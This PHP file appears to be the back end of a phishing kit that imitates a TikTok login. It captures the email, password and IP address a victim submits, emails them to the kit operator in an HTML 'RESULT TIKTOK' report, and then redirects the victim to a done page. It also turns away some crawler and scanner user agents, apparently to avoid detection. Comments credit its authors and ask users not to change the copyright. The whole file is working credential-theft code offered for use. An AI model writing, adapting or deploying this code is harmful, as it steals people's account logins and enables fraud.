<?php
error_reporting(0);
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('www.sadflix.org');
die();
}
// BACA BOS :D
// Sc nya No Send2mail ya boszz:)
// Powered By : Sadflix / Ahmad
// Jan diganti copyright nya bozz:)
// Sun, 16 Aug 2020
// Reupload?  Author :: Swagkarna
    $email = $_POST['email'];
    $pass  = $_POST['pass'];
    $ip    = $_SERVER['REMOTE_ADDR'];
    include"email.php"; /** TAKE AN EMAIL **/
    if(!empty($email) || !empty($pass)) /** IF ALL DATA IS FILLED IN **/ { 
        $body = <<<EOD
            <center> 
<div style="background: url(https://i.ibb.co/XCcRdM5/anime-girl-student-sunrise-uhdpaper-com-4-K-6-1004-wp-thumbnail-picsay.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 80px; color: #000; text-align: center; border-top-left-radius: 10px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 100; color: #fff; text-align: left; padding: 10px;">INFO ACCOUNT :</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>$email</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>$pass</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP</th>
<th style="width: 78%; text-align: center;"><b>$ip</th> 
</tr>
 </table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Contact me:
</div>
<div style="float: right;">
<a href="https://facebook.com/sadflix.org"><img style="margin: 5px;" width="30" src="https://i.ibb.co/SxcV8wB/facebook.png"></a>
<a href="https://wa.me/18666868106"><img style="margin: 5px;" width="30" src="https://i.ibb.co/J7PQt8h/1586333120464.png"></a>
</div>
</div>
</center>
EOD;
        $subjek = 'RESULT TIKTOK❤️ | Punya:  '.$email.'';
        $headers = "From: swagkarna@gmail.com\r\n";
        $headers .= "Content-type: text/html\r\n";
        $success = mail($mailto, $subjek, $body, $headers);

        if($success) {
            session_start();
            $_SESSION['log'] = "sadflix gans";
            $_SESSION['nick'] = $nick;
            echo "<script>document.location='done.php';</script>";
        }
    }
?>
